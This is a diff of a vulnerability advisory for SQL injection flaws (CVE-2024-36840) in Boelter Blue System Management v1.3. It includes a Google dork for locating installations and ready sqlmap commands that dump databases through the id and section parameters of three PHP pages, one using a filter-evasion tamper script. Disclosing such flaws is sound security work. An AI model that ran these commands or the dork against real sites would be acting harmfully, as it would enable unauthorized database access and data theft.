@@ -7,21 +7,37 @@
 **Google Dork**: "Powered by Boelter Blue" 
 **Vendor**: Boelter Blue ([boelter.com](https://www.boelter.com/))  
 **Software Link**: [Google Play Store](https://play.google.com/store/apps/details?id=com.anchor5digital.anchor5adminapp&hl=en_US)  
+# Tested on: Linux Debian 9 (stretch), Apache 2.4.25, MySQL >= 5.0.12
+**CVE**: CVE-2024-36840
+
 
 ## Overview
 
 Boelter Blue System Management v1.3 has been found to contain multiple critical SQL injection vulnerabilities. These vulnerabilities allow attackers to execute arbitrary SQL queries, potentially leading to sensitive data exposure, unauthorized access, and complete control over the affected database.
 
-## Vulnerabilities
+## Affected Component##
+> news_details.php
+> services.php
+> location_details.php
 
-### 1. SQL Injection in `news_details.php`
-**Vulnerable Parameter**: `id`  
-**Type**: Boolean-based blind, Time-based blind, Union-based injection  
-**Impact**: Full database access, Information disclosure, Account takeover
+>  - id parameter
+>  - section parameter
 
 #### PoC Example
 **SQLMap Injection**: 
 `sqlmap -u "https://www.example.com/news_details.php?id=10071" --random-agent --dbms=mysql --dbs`
+
+
+**news_details.php?id** parameter:
+   `sqlmap -u "https://www.example.com/news_details.php?id=10071" --random-agent --dbms=mysql --threads=4 --dbs`
+   
+**services.php?section** parameter:
+   `sqlmap -u "https://www.example.com/services.php?section=5081" --random-agent --tamper=space2comment --threads=8 --dbs`
+   
+**location_details.php?id** parameter:
+   `sqlmap -u "https://www.example.com/location_details.php?id=836" --random-agent --dbms=mysql --dbs`
+
+
 
 
 **Injection Types**:
@@ -194,7 +210,7 @@ To mitigate these vulnerabilities, it is recommended to:
 
 ## CVE Information
 
--   **CVE ID**: Pending
+-   **CVE ID**: CVE-2024-36840
 
 ## Contact Information
 
@@ -204,3 +220,5 @@ For any questions or concerns regarding this vulnerability, please contact us at
 
 [CBKB]-   DeadlyData, 
 [CBKB]-   R4d1x
+
+
